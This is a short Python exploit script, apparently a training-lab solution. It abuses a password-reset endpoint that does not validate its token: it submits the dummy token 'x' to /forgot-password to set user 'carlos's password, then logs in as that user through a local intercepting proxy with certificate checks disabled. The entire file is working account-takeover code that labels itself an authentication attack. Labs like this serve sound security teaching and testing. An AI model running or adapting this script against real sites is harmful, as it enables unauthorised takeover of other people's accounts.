import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_password_reset_sucessful(url, session):
    password_reset_url = (
        url + "/forgot-password?"
        "temp-forgot-password-token=x")
    password_reset_data = {
        "temp-forgot-password-token": "x",
        "username": "carlos",
        "new-password-1": "password",
        "new-password-2": "password"}
    response = session.post(
        password_reset_url,
        data=password_reset_data,
        verify=False,
        proxies=proxies)
    return response.status_code == 200  

def is_login_successful(url, session):
    login_url = url + "/login"
    login_data = {
        "username": "carlos",
        "password": "password"}
    response = session.post(
        login_url,
        data=login_data,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        if not is_password_reset_sucessful(url, session):
            print("[-] Password Reset Failed.") 
            sys.exit(FAIL) 
        print("[+] Password Reset Successful.")
        if not is_login_successful(url, session):
            print("[-] Login Failed.")
            sys.exit(FAIL)
        print("[+] Login Successful.")
    except IndexError:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The authentication attack was not successful.")
        sys.exit(FAIL)    